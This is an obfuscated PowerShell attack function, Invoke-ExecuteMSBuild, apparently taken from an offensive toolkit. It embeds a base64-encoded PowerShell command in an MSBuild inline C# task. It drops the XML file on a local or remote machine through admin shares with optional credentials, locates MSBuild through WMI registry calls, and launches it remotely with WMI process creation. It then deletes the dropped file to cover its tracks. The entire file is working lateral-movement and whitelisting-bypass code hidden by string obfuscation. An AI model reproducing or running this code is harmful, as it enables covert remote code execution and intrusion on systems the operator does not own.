 SeT-ITEm ("vAriAble:mr"+"3"+"x"+"Ge") ([typE]("{0}{1}{2}"-f 'SYsTeM.','c','ONvERT')) ;    Sv  ('b'+'QJa')  ([TypE]("{1}{4}{3}{2}{0}{5}"-f'xt.enCODi','sysT','tE','.','em','ng'))  ;  function iNVoKe-eXeC`U`TeM`SB`UIld
{
    

    [CmdletBinding()]
    param
    (
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]${CoMp`Ute`RnaMe},

        [Parameter(parAMeTerSeTNAmE = "cre`denT`iA`LS")]
        [ValidateNotNullOrEmpty()]
        [string]${USe`RN`Ame},

        [Parameter(ParAMEtErSEtNaME = "cR`EdeNtIa`Ls")]
        [ValidateNotNullOrEmpty()]
        [string]${paSS`w`ORD},

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]${fiL`EPa`TH} = ((("{2}{4}{6}{1}{5}{0}{3}" -f'l.xm','s{0}p','C:{0}Win','l','do','shel','ws{0}Task'))-F[chAR]92),

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern({"{1}{0}{2}"-f '-z','[a','A-Z]:'})]
        [string]${dRi`Ve`l`EttER} = "T:",

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]${CO`mma`Nd}
    )

    ${Com`m`Ona`RGs} = @{}
    ${Wm`I`Args} = @{}

    function iNvOKE-exe`C`U`Tem`SbuI`lDhElper {
        &("{3}{1}{2}{0}"-f 'e','e-V','erbos','Writ') ("{6}{0}{1}{4}{5}{7}{3}{8}{2}"-f']Executi','n','ml....',' ','g MSB','ui','[+','ld','with x') 
        ${W`m`iArgS} = @{
            ("{2}{0}{3}{1}" -f 'am','ace','N','esp') = ("{0}{1}{2}" -f 'r','oot/CIMV','2')
            ("{0}{1}"-f 'C','lass') = ("{3}{1}{2}{0}" -f's','32_Proce','s','Win')
            ("{0}{1}"-f 'N','ame') = ("{2}{1}{0}"-f'eate','r','C')
        }

        ${C`Md} = ('cm'+'d.exe'+' '+'/c'+' '+"$MSBuildPath "+"$FilePath")

        ${wmi`Ar`gs}[("{1}{0}{3}{2}" -f'rgument','A','ist','L')] = ${C`Md}
                    
        ${RES`Ult} = &("{1}{0}{2}{3}" -f'WmiM','Invoke-','etho','d') @WmiArgs @commonArgs 
        if (${REs`UlT}."rETUrNV`A`lUE" -ne 0) {
            &("{0}{1}{2}{3}" -f 'W','rite-','Verbo','se') "Unable to execute $cmd with error code: $($result.ReturnValue) "
        }
        ${resu`lt}
    }

    ${IN`LineT`ASk} = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
   <FragmentExample />
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
    <Using Namespace="System.IO" />
      <Code Type="Fragment" Language="cs">
        <![CDATA[
          Console.WriteLine("Hello From Fragment");
        ]]>
      </Code>
    </Task>
  </UsingTask>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
    
      using System;
      using System.IO;
      using System.Diagnostics;
      using System.Reflection;
      using System.Runtime.InteropServices;

      //Add For PowerShell Invocation
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using System.Text;


      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;
              
      public class ClassExample :  Task, ITask
      {
        public override bool Execute()
        {
              string encCommand = "ENCCOMMAND";
                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    RunspaceInvoke rInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
                    //Decode the base64 encoded command
                    byte[] data = Convert.FromBase64String(encCommand);
                    string command = Encoding.ASCII.GetString(data);

                    pipeline.Commands.AddScript(command);
                    pipeline.Invoke();
                    runspace.Close();
          
              return true;
          }

            }
 
      
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

"@

    
    ${em`B`edDeDcomMa`Nd} = ((("{0}{2}{1}{3}" -f '{0','NCH','}
LAU','ER
{0}')) -F[ChAr]34)


    
    if ((${psbOUN`dP`ArAmE`T`e`RS}[("{3}{2}{0}{1}" -f 'N','ame','ter','Compu')])) { 
        ${c`oMMO`NA`RGs}[("{2}{0}{3}{1}"-f'N','me','Computer','a')] = ${Com`P`Ute`RNAME} 
        if (${PS`CM`DlET}.pArAMeterSetnAME -eq ("{0}{2}{3}{1}"-f'Cre','s','dent','ial')) {
            ${M`Oun`TS`hARE} = ${TR`UE}
            ${secuRe`Pa`s`swo`RD} = ${pA`ssW`ORD} | &("{3}{4}{5}{0}{2}{1}"-f'eStr','ng','i','ConvertTo-S','ecu','r') -AsPlainText -Force
            ${CRE`D`E`NTiAl} =  &("{2}{0}{1}{3}" -f'e','w-O','N','bject') ("{1}{4}{7}{5}{0}{6}{3}{2}"-f'ation','Sys','edential','SCr','tem.M','nt.Autom','.P','anageme')(${UsErn`A`mE}, ${se`c`UrepaS`sWoRd})
            ${com`M`oNAR`gS}[("{0}{2}{3}{1}"-f 'Cre','al','dent','i')] = ${cRED`eNTi`Al}
        }
    }

    if ( -not ${p`sbOUndp`ARAMe`TERs}[("{0}{1}"-f 'Comm','and')]) {
        &("{2}{1}{0}" -f '-Verbose','ite','Wr') ("{12}{1}{13}{3}{10}{6}{4}{2}{5}{0}{8}{11}{14}{9}{7}"-f' us','omm','r no','d p','amete','t','r','.','ed, u','ded command...','a','sing','[+]C','an',' embed')
        ${coM`ManD} = ${EmBEd`DeDcO`mMANd}
    }

    
    &("{1}{4}{0}{2}{3}"-f'r','Write-V','b','ose','e') ("{5}{3}{4}{1}{6}{2}{0}" -f'....','fting ',' file.','+]C','ra','[','the xml')
    ${E`NC} =  ( GeT-vaRIABlE  ('Mr'+'3xGe') )."vA`lUE"::"T`obaSe`64stRiNg"( $bQja::"asC`II".("{2}{0}{1}" -f'etBy','tes','G').Invoke(${com`m`And}))
    ${InlI`N`e`Task} = ${iNLIne`T`ASK}.("{0}{1}"-f 'Replac','e').Invoke(("{0}{1}{2}" -f 'ENCCOMM','A','ND'),${e`NC})

    
    
    &("{0}{3}{4}{2}{1}"-f'Wr','e','Verbos','i','te-') ("{5}{1}{2}{3}{4}{6}{7}{0}" -f 'th....','+]','Enum','erat','ing','[',' the MSBuildTools',' pa')
    ${hi`V`Eval} = [UInt32]2147483650
    ${sSUb`Key`NA`mE} = ((("{9}{2}{3}{5}{8}{4}{11}{0}{1}{10}{6}{7}"-f 'Gd','4Tools','Gd4M','icr','4','osof','G','d44.0','tGd','SOFTWARE','Versions','MSBuild')) -crePLaCE ([ChAr]71+[ChAr]100+[ChAr]52),[ChAr]92)
    ${WM`IAR`gs} = @{
        ("{0}{1}{2}"-f 'Namespa','c','e') = ("{2}{0}{1}"-f '/DE','FAULT','root')
        ("{1}{0}" -f's','Clas') = ("{0}{2}{1}"-f 'S','Prov','tdReg')
        ("{1}{0}" -f 'ame','N') = ("{0}{1}" -f'Enu','mKey')
        ("{2}{1}{3}{0}" -f't','rgu','A','mentLis') = ${h`i`VevAL}, ${SSub`K`ey`NamE}
    }

    if ((&("{2}{3}{1}{0}" -f'ethod','-WmiM','In','voke') @WmiArgs @commonArgs)."ReTurnvA`l`UE" -eq 0) {
        ${SvaL`U`E`Name} = ("{0}{3}{1}{2}{4}" -f'MS','l','sPat','BuildToo','h')
        ${WmI`A`RgS}[("{0}{1}" -f'Na','me')] = ("{1}{3}{2}{0}"-f 'lue','G','Va','etString')
        ${w`MIaR`Gs}[("{1}{0}{3}{2}"-f'umen','Arg','List','t')] = ${HI`VEVaL},${s`SuBKEyN`A`mE},${SVal`U`ename}

        ${Res`UlT} = &("{0}{1}{4}{3}{2}" -f'Invoke-','Wmi','d','tho','Me') @WmiArgs @commonArgs
        if (${R`E`sUlt}."reTu`RnV`A`luE" -ne 0) {
            &("{2}{1}{0}"-f 'ror','ite-Er','Wr') ("{0}{2}{4}{1}{3}{6}{5}{11}{13}{9}{7}{10}{12}{8}{14}"-f'Un',' ','a','to','ble','ta',' ob','o','f','l','ca','in MSBu','tion ','ild ','rom the registry')
            break
        }

        ${msBu`iL`dP`AtH} = "$($result.sValue)MSBuild.exe"
    }
    else {
        &("{1}{3}{0}{2}" -f'-Er','Wri','ror','te') ("{8}{9}{6}{1}{2}{13}{0}{5}{4}{11}{3}{10}{12}{7}" -f'Build','b','le to','t','oo','T','a',' key','U','n','r','ls regis','y',' enumerate MS')
        break
    }

    
    ${wMi`ARgs} = @{
        ("{2}{1}{0}"-f'ace','amesp','N') = ("{1}{0}{2}"-f'oot/C','r','IMV2')
        ("{1}{0}"-f 's','Clas') = ("{3}{2}{4}{0}{5}{1}" -f'ratin','m','n32_Op','Wi','e','gSyste')
    }
    &("{0}{1}{2}" -f'Write-V','erb','ose') ("{8}{0}{4}{11}{7}{13}{9}{3}{12}{2}{1}{6}{10}{5}"-f'Enumera',' dri','m','ault','tin','...','ve','the','[+]','f','...','g ',' syste',' de')
    ${sy`ST`eM`Direc`ToRY} = (&("{1}{2}{3}{0}{4}" -f'miOb','Ge','t','-W','ject') @WmiArgs @commonArgs)."sYSTE`m`dIRe`c`TorY"
    ${DE`F`AULtdRiVe} = ${SyS`TEm`di`R`eCtOry}.("{1}{0}" -f't','Spli').Invoke('\')[0]
    if (${dEfAU`ltDr`I`Ve} -ne $(${FIle`pA`TH}.("{0}{1}"-f'Spli','t').Invoke('\')[0])) {
        ${FIl`eP`A`Th} = "$DefaultDrive$($FilePath.Split(':')[1])"
    }

    if (${MoU`NtshA`RE}) {
        
        ${nEt`WO`Rk} = &("{1}{2}{0}" -f 'Object','N','ew-') -ComObject ("{2}{0}{3}{1}"-f 'ipt.N','k','Wscr','etwor')
        try {
            ${s`h`ARePaTH} = (("\\$ComputerName\$($DefaultDrive.Replace(':','$'))"))
            ${n`e`TwoRk}.("{0}{1}{3}{2}" -f'Ma','p','etworkDrive','N').Invoke(${DRi`VE`let`TER},${sHarE`P`ATH},${FAl`se},${c`Red`e`NtIAL}.("{1}{3}{2}{0}" -f 'ntial','G','Crede','etNetwork').Invoke()."US`E`RNaMe",${Credent`I`AL}.("{2}{1}{3}{0}{4}"-f 'ntia','e','G','tNetworkCrede','l').Invoke()."pass`WORd")
            ${inL`InE`T`ASk} | &("{1}{0}{2}"-f'ut','O','-File') -FilePath "$DriveLetter$($FilePath.Split(':')[1])" -Encoding ("{1}{0}" -f 'ii','asc')
        }
        catch [System.Exception] {
            
            &("{2}{1}{0}"-f 'e-Error','it','Wr') ${_} 
            ${N`UlL} = ${n`ETW`Ork}.("{0}{2}{4}{3}{1}"-f 'Remov','rive','eNetw','D','ork').Invoke(${Dr`IVel`ETTEr},${tr`UE},${tR`UE})
            break
        }

        &("{5}{0}{3}{1}{4}{2}" -f 'oke','MS','lper','-Execute','BuildHe','Inv')

        
        &("{3}{0}{2}{1}" -f'ar','ep','t-Sle','St') -Seconds 10
        &("{0}{1}{2}{3}"-f'R','e','move-It','em') "$DriveLetter\$($FilePath.Split(':')[1])"
        ${N`E`Twork}.("{3}{0}{2}{1}{5}{4}"-f'v','t','eNe','Remo','ve','workDri').Invoke(${d`RIVEL`e`TTeR},${T`Rue},${Tr`UE})
    }
    elseif (${co`m`m`onARgs}[("{0}{2}{1}" -f 'Comput','Name','er')]) {
        
        
        &("{3}{1}{0}{4}{2}"-f'er','ite-V','ose','Wr','b') ('[+]User'+'Na'+'me'+' '+'and'+' '+'Pa'+'ssw'+'ord '+'p'+'aram'+'ete'+'rs '+'wer'+'e '+'not'+' '+'us'+'ed.'+' '+'C'+'o'+'pying '+'th'+'e '+'x'+'ml '+'fi'+'le '+'using'+' '+'th'+'e '+"C$ "+'Defau'+'lt '+'Sh'+'are '+'on'+' '+"$ComputerName")
        ${Rem`oTe`path} = (("\\$ComputerName\$($FilePath.Replace(':','$'))"))

        try {
            ${iNliNe`Ta`Sk} | &("{1}{0}" -f'ut-File','O') -Encoding ("{0}{1}"-f'a','scii') ${R`EmoTE`P`AtH}
        }
        catch [System.Exception] {
            &("{2}{1}{0}"-f 'or','e-Err','Writ') ${_} 
            break
        }

        .("{5}{7}{6}{2}{4}{0}{1}{3}" -f 'SB','uil','ut','dHelper','eM','Invo','c','ke-Exe')
        
        &("{2}{0}{1}" -f'ee','p','Start-Sl') -Seconds 10
        &("{0}{1}{2}"-f 'Remo','ve','-Item') ${rEm`oTe`PaTh}
    }
    else {
        
        &("{0}{1}{2}"-f 'Write-Verb','os','e') ('[+]Wri'+'ting'+' '+'t'+'he '+'fil'+'e '+'loca'+'ll'+'y '+'to'+' '+"$FilePath")
        try {
            ${i`NL`iNETA`sk} | &("{1}{0}{2}"-f 'ut-F','O','ile') -Encoding ("{0}{1}" -f 'asci','i') ${File`P`A`TH}
        }
        catch [System.Exception] {
            .("{0}{2}{3}{1}"-f'W','r','rite-Err','o') ${_} 
            break
        }

        &("{3}{1}{2}{5}{8}{7}{6}{0}{4}"-f'l','n','voke-Ex','I','dHelper','ecut','SBui','M','e')
        .("{3}{1}{2}{0}" -f'p','tart','-Slee','S') -Seconds 10
        .("{1}{0}{2}"-f'e','R','move-Item') ${fILEP`A`TH} -Force
    }

}